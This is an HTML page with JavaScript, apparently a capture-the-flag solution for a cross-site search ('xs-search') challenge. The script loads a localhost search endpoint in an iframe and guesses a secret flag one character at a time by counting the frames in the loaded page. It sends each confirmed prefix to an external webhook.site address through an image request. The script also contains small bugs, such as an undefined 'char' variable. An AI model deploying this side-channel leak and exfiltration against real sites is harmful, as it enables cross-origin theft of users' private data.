<!doctype html>
        <h1>xs-search</h1>
        <iframe id="iframe"></iframe>
        <img id="img">
        
        <script>
        const chars = '0123456789abcde}';
        const url = 'http://localhost:8000/search?query=';
        
        function search(flag, e){
            iframe.src = url + flag + chars[e];
            iframe.onload = () => {
                if (iframe.contentWindow.frames.length != 0) {
                    console.log("flag " + flag)
                    img.src = "https://webhook.site/18a28310-12ca-4c97-a6b7-32b6063d1fb6?flag=" + flag + chars[e];
                    if(e === '}'){
                        console.log("flag = " + flag + char[e])
                    }
                    flag = flag.concat(chars[e]);
                    e = 0
                    console.log(flag)
                    search(flag, e)
                                
                }
                search(flag, e + 1)
            }
        }
        
        function exploit(){
            var flag = '';
        var e = 0
        search(flag, e)
    }
    exploit()
    
</script>
